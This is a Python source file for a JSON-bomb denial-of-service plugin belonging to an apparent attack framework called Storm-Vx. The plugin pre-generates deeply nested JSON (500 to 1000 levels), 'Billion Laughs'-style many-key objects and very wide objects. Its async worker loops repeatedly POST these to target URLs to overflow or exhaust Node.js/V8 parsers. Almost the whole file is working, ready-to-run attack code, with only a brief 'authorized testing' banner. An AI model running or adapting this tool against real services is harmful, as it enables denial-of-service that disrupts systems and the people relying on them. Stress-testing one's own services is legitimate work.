#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
vf_json_bomb — JSON Bomb Attack Plugin

Sends deeply nested JSON payloads and "Billion Laughs" variants to
exhaust the V8 parser. JSON.parse() on deeply nested JSON causes
Stack Overflow in Node.js. Also sends "Billion Laughs" style JSON
with thousands of alias references.

Part of the Storm-Vx plugin architecture.

FOR AUTHORIZED TESTING ONLY!
"""

from __future__ import annotations

import asyncio
import time
import random
from typing import Dict, Any, List


from plugin_system import PluginMeta, AttackContext
from tester.vf_attack_base import AttackPlugin
from vf_common import C, rand_str
import aiohttp


__all__ = ["JsonBombPlugin"]


class JsonBombPlugin(AttackPlugin):
    """JSON Bomb — deeply nested JSON + Billion Laughs to crash V8/Node.js parser.

    Generates three types of malicious JSON payloads:
    1. Deep Nesting: 500+ levels of nested objects to cause V8 stack overflow
    2. Billion Laughs: Thousands of key aliases for hash collision bombs
    3. Wide Bomb: 10,000+ keys at root level for hash table pressure

    Payloads are pre-generated in __init__ to avoid rebuilding each time.
    Three variants of each type are generated and rotated through.
    """

    meta = PluginMeta(
        name='json_bomb',
        version='1.0.0',
        plugin_type='attack',
        description='JSON bomb — deeply nested JSON + Billion Laughs to crash V8/Node.js parser (30x)',
        tags=['http', 'json', 'nodejs', 'cpu-burn', 'parser-bomb'],
        priority=27,
        compatible_profiles=[],
        requirements=['aiohttp'],
    )

    def __init__(self) -> None:
        super().__init__()
        # Pre-generate payload variants (3 per type) to avoid rebuilding each request
        self._payloads: List[str] = []
        self._payload_index: int = 0

        # Deep nesting variants (3 depths: 500, 750, 1000)
        for depth in (500, 750, 1000):
            self._payloads.append(self._build_deep_nested(depth))

        # Billion Laughs variants (3 alias counts: 2000, 3500, 5000)
        for aliases in (2000, 3500, 5000):
            self._payloads.append(self._build_billion_laughs(aliases))

        # Wide bomb variants (3 key counts: 10000, 15000, 20000)
        for keys in (10000, 15000, 20000):
            self._payloads.append(self._build_wide_bomb(keys))

    @staticmethod
    def _build_deep_nested(depth: int = 500) -> str:
        """Build deeply nested JSON that crashes V8 parser via stack overflow.

        Generates JSON nested `depth` levels deep:
        {"a":{"a":{"a":...}}}
        """
        inner = '"val"'
        for _ in range(depth):
            inner = f'{{"a":{inner}}}'
        return inner

    @staticmethod
    def _build_billion_laughs(aliases: int = 2000) -> str:
        """Build JSON with thousands of key aliases (hash collision bomb).

        Creates a flat JSON object with many keys sharing a common prefix
        to stress hash table implementations.
        """
        parts: List[str] = []
        base = rand_str(4)
        for i in range(aliases):
            key = f"{base}_{i:04d}"
            parts.append(f'"{key}":"{rand_str(20)}"')
        return "{" + ",".join(parts) + "}"

    @staticmethod
    def _build_wide_bomb(keys: int = 10000) -> str:
        """Build very wide JSON with many keys at root level.

        Creates a flat JSON object with `keys` entries to stress
        hash table memory allocation and key lookup performance.
        """
        parts: List[str] = []
        for i in range(keys):
            parts.append(f'"k{i}":"{rand_str(8)}"')
        return "{" + ",".join(parts) + "}"

    def _next_payload(self) -> str:
        """Get the next payload in rotation."""
        payload = self._payloads[self._payload_index % len(self._payloads)]
        self._payload_index += 1
        return payload

    async def _worker_loop(self, context: AttackContext, worker_id: int) -> None:
        """JSON bomb worker: send malicious JSON payloads via POST."""
        _ssl = context.ssl_param

        pages = context.page_targets or [context.url]
        delay_ms = context.extra.delay_ms

        while not self._stop_event.is_set():
            try:
                url = random.choice(pages)

                # Get next pre-generated payload
                payload = self._next_payload()

                headers = self._get_fresh_headers(context, "api")
                headers["Content-Type"] = "application/json"

                t = time.time()
                try:
                    async with context.session.post(
                        url,
                        headers=headers,
                        data=payload,
                        ssl=_ssl,
                        allow_redirects=False,
                        compress=False,
                    ) as resp:
                        rt = time.time() - t
                        ok = resp.status < 500
                        await self._record("JSON-BOMB", ok, resp.status, rt, url=url[:60])
                        # Drain response body to free the connection
                        try:
                            await resp.read()
                        except asyncio.CancelledError:
                            raise
                        except (aiohttp.ClientError, RuntimeError, OSError):
                            pass  # Response drain failure is acceptable
                except asyncio.CancelledError:
                    raise
                except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                    rt = time.time() - t
                    await self._record("JSON-BOMB", False, 0, rt,
                                       err=type(exc).__name__, url=url[:60])

                if delay_ms > 0:
                    await asyncio.sleep(delay_ms / 1000.0)

            except asyncio.CancelledError:
                return
            except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                await self._record("JSON-BOMB", False, 0, 0, err=type(exc).__name__)
                await asyncio.sleep(0.1)

